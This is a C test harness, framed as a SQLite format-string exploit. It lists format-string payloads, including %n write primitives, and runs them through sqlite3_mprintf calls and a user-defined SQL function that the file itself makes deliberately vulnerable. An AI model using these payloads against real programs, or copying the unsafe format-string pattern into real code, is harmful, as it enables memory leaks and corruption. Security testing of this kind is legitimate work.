/*
** SQLite3 Format String Attack Exploit
** Target: sqlite3_mprintf format string vulnerabilities
** 
** SECURITY NOTICE: This code is for defensive security research only.
** Do not use for malicious purposes.
*/

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>
#include "sqlite3.h"

#define FORMAT_DB_PATH "./inputs/format_string.db"
#define MAX_FORMAT_PAYLOAD 512

static volatile int format_exploit_detected = 0;

/*
** Signal handler for format string exploitation detection
*/
void format_crash_handler(int sig) {
    printf("[!] FORMAT STRING CRASH: Signal %d received\n", sig);
    printf("[!] Format string exploitation may have succeeded\n");
    format_exploit_detected = 1;
    exit(1);
}

/*
** Create malicious format string payloads
*/
struct format_payload {
    const char* name;
    const char* payload;
    const char* description;
};

static struct format_payload format_payloads[] = {
    {
        "stack_read", 
        "%x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x",
        "Read stack values"
    },
    {
        "pointer_leak", 
        "%p %p %p %p %p %p %p %p %p %p",
        "Leak pointer addresses"
    },
    {
        "write_primitive", 
        "%n%n%n%n%n%n%n%n",
        "Write primitive attempt"
    },
    {
        "large_width", 
        "%99999999d %99999999x %99999999s",
        "Large width specifiers"
    },
    {
        "null_deref", 
        "%s%s%s%s%s%s%s%s%s%s",
        "Null pointer dereference"
    },
    {
        "buffer_overflow", 
        "%.999999999s %.999999999x %.999999999d",
        "Buffer overflow via precision"
    },
    {
        "direct_write", 
        "%1$n %2$n %3$n %4$n %5$n",
        "Direct parameter write"
    },
    {
        "mixed_attack", 
        "%x%x%x%x%n%p%p%p%s%s%s%n%n%n",
        "Combined format string attack"
    }
};

/*
** Create database with format string injection points
*/
int create_format_string_database(const char* db_path) {
    sqlite3 *db;
    char *error_msg = 0;
    int rc;
    
    printf("[+] Creating format string test database: %s\n", db_path);
    
    system("mkdir -p ./inputs/");
    
    rc = sqlite3_open(db_path, &db);
    if (rc != SQLITE_OK) {
        printf("[-] Cannot create database: %s\n", sqlite3_errmsg(db));
        return -1;
    }
    
    /* Drop existing table if it exists and create fresh table */
    sqlite3_exec(db, "DROP TABLE IF EXISTS format_test;", 0, 0, NULL);
    
    /* Create table for format string testing */
    const char* create_sql = 
        "CREATE TABLE format_test ("
        "id INTEGER PRIMARY KEY, "
        "user_input TEXT, "
        "format_data TEXT, "
        "result_data TEXT"
        ");";
    
    rc = sqlite3_exec(db, create_sql, 0, 0, &error_msg);
    if (rc != SQLITE_OK) {
        printf("[-] Table creation failed: %s\n", error_msg);
        sqlite3_free(error_msg);
        sqlite3_close(db);
        return -1;
    }
    
    /* Insert format string payloads */
    for (int i = 0; i < sizeof(format_payloads)/sizeof(format_payloads[0]); i++) {
        char insert_sql[2048];
        snprintf(insert_sql, sizeof(insert_sql),
            "INSERT INTO format_test (user_input, format_data) VALUES ('%s', '%s');",
            format_payloads[i].name, format_payloads[i].payload);
        
        rc = sqlite3_exec(db, insert_sql, 0, 0, &error_msg);
        if (rc != SQLITE_OK) {
            printf("[-] Insert failed for payload %s: %s\n", 
                   format_payloads[i].name, error_msg);
            sqlite3_free(error_msg);
        }
    }
    
    sqlite3_close(db);
    printf("[+] Format string test database created\n");
    return 0;
}

/*
** Test direct sqlite3_mprintf vulnerabilities
*/
int test_direct_mprintf_vulnerabilities() {
    printf("[+] Testing direct sqlite3_mprintf vulnerabilities...\n");
    
    for (int i = 0; i < sizeof(format_payloads)/sizeof(format_payloads[0]); i++) {
        printf("[+] Testing payload: %s (%s)\n", 
               format_payloads[i].name, format_payloads[i].description);
        
        /* DANGEROUS: Direct format string vulnerability */
        char* result = sqlite3_mprintf(format_payloads[i].payload);
        
        if (result) {
            printf("[+] mprintf result length: %zu\n", strlen(result));
            if (strlen(result) > 0 && strlen(result) < 1000) {
                printf("[+] Result preview: %.100s%s\n", 
                       result, strlen(result) > 100 ? "..." : "");
            }
            sqlite3_free(result);
        } else {
            printf("[-] mprintf returned NULL for payload: %s\n", 
                   format_payloads[i].name);
        }
        
        usleep(100000);  /* 100ms delay between tests */
    }
    
    return 0;
}

/*
** Test format string via SQL injection
*/
int test_sql_format_injection(const char* db_path) {
    sqlite3 *db;
    sqlite3_stmt *stmt;
    int rc;
    
    printf("[+] Testing format string via SQL injection...\n");
    
    rc = sqlite3_open(db_path, &db);
    if (rc != SQLITE_OK) {
        printf("[-] Cannot open database: %s\n", sqlite3_errmsg(db));
        return -1;
    }
    
    /* Test format string in error messages and internal functions */
    for (int i = 0; i < sizeof(format_payloads)/sizeof(format_payloads[0]); i++) {
        printf("[+] SQL injection test: %s\n", format_payloads[i].name);
        
        /* Create malicious SQL with format strings */
        char malicious_sql[2048];
        
        /* Test 1: Format string in table name (will likely fail but test internal handling) */
        snprintf(malicious_sql, sizeof(malicious_sql),
            "SELECT * FROM 'table_%s' WHERE 1=1;", format_payloads[i].payload);
        
        rc = sqlite3_prepare_v2(db, malicious_sql, -1, &stmt, NULL);
        if (rc != SQLITE_OK) {
            printf("[+] Expected error with format injection: %s\n", sqlite3_errmsg(db));
        } else {
            sqlite3_finalize(stmt);
        }
        
        /* Test 2: Format string in function calls */
        snprintf(malicious_sql, sizeof(malicious_sql),
            "SELECT printf('%s', 'test_data');", format_payloads[i].payload);
        
        rc = sqlite3_prepare_v2(db, malicious_sql, -1, &stmt, NULL);
        if (rc == SQLITE_OK) {
            while (sqlite3_step(stmt) == SQLITE_ROW) {
                const char* result = (const char*)sqlite3_column_text(stmt, 0);
                if (result) {
                    printf("[+] printf result: %.100s%s\n", 
                           result, strlen(result) > 100 ? "..." : "");
                }
            }
            sqlite3_finalize(stmt);
        }
        
        /* Test 3: Format string in RAISE() function */
        snprintf(malicious_sql, sizeof(malicious_sql),
            "SELECT CASE WHEN 1=1 THEN RAISE(ABORT, '%s') END;", 
            format_payloads[i].payload);
        
        rc = sqlite3_prepare_v2(db, malicious_sql, -1, &stmt, NULL);
        if (rc == SQLITE_OK) {
            rc = sqlite3_step(stmt);
            if (rc != SQLITE_ROW) {
                printf("[+] RAISE error with format: %s\n", sqlite3_errmsg(db));
            }
            sqlite3_finalize(stmt);
        }
        
        usleep(50000);  /* 50ms delay */
    }
    
    sqlite3_close(db);
    return 0;
}

/*
** Test format string in user-defined functions
*/
void format_string_function_callback(sqlite3_context *context, int argc, sqlite3_value **argv) {
    if (argc > 0) {
        const char* format_input = (const char*)sqlite3_value_text(argv[0]);
        if (format_input) {
            /* DANGEROUS: Using user input as format string */
            char* result = sqlite3_mprintf(format_input);
            if (result) {
                sqlite3_result_text(context, result, -1, sqlite3_free);
            } else {
                sqlite3_result_null(context);
            }
        }
    }
}

int test_udf_format_injection(const char* db_path) {
    sqlite3 *db;
    sqlite3_stmt *stmt;
    int rc;
    
    printf("[+] Testing format string in user-defined functions...\n");
    
    rc = sqlite3_open(db_path, &db);
    if (rc != SQLITE_OK) {
        printf("[-] Cannot open database\n");
        return -1;
    }
    
    /* Register vulnerable function */
    rc = sqlite3_create_function(db, "vulnerable_format", 1, SQLITE_UTF8, NULL,
                                format_string_function_callback, NULL, NULL);
    if (rc != SQLITE_OK) {
        printf("[-] Failed to register function\n");
        sqlite3_close(db);
        return -1;
    }
    
    /* Test format string payloads through UDF */
    for (int i = 0; i < sizeof(format_payloads)/sizeof(format_payloads[0]); i++) {
        printf("[+] UDF test: %s\n", format_payloads[i].name);
        
        char test_sql[1024];
        snprintf(test_sql, sizeof(test_sql),
            "SELECT vulnerable_format('%s');", format_payloads[i].payload);
        
        rc = sqlite3_prepare_v2(db, test_sql, -1, &stmt, NULL);
        if (rc == SQLITE_OK) {
            while (sqlite3_step(stmt) == SQLITE_ROW) {
                const char* result = (const char*)sqlite3_column_text(stmt, 0);
                if (result) {
                    printf("[+] UDF result: %.100s%s\n", 
                           result, strlen(result) > 100 ? "..." : "");
                }
            }
            sqlite3_finalize(stmt);
        }
        
        usleep(50000);
    }
    
    sqlite3_close(db);
    return 0;
}

/*
** Check for format string exploitation indicators
*/
void check_format_string_indicators() {
    printf("\n[+] Checking for format string exploitation indicators...\n");
    
    /* Check for core dumps */
    if (access("core", F_OK) == 0) {
        printf("[!] Core dump detected - potential format string crash\n");
    }
    
    /* Check for unusual memory patterns */
    printf("[+] Memory usage check:\n");
    system("ps aux | grep -E '(PID|format_string)' | head -5");
    
    if (format_exploit_detected) {
        printf("[!] Format string exploitation indicators detected\n");
    } else {
        printf("[+] No obvious format string exploitation detected\n");
    }
    
    printf("[+] Format string indicator check completed\n");
}

int main(int argc, char** argv) {
    printf("=== SQLite3 Format String Attack Exploit ===\n");
    printf("Target: sqlite3_mprintf format string vulnerabilities\n");
    printf("WARNING: For defensive security research only!\n\n");
    
    /* Install crash handler */
    signal(SIGSEGV, format_crash_handler);
    signal(SIGABRT, format_crash_handler);
    signal(SIGBUS, format_crash_handler);
    
    /* Create test database */
    if (create_format_string_database(FORMAT_DB_PATH) != 0) {
        return 1;
    }
    
    /* Execute format string tests */
    printf("[+] Starting format string exploitation tests...\n");
    
    test_direct_mprintf_vulnerabilities();
    test_sql_format_injection(FORMAT_DB_PATH);
    test_udf_format_injection(FORMAT_DB_PATH);
    
    /* Check for exploitation indicators */
    check_format_string_indicators();
    
    printf("\n[+] Format string exploit test completed\n");
    printf("[+] Check results for potential format string vulnerabilities\n");
    return 0;
}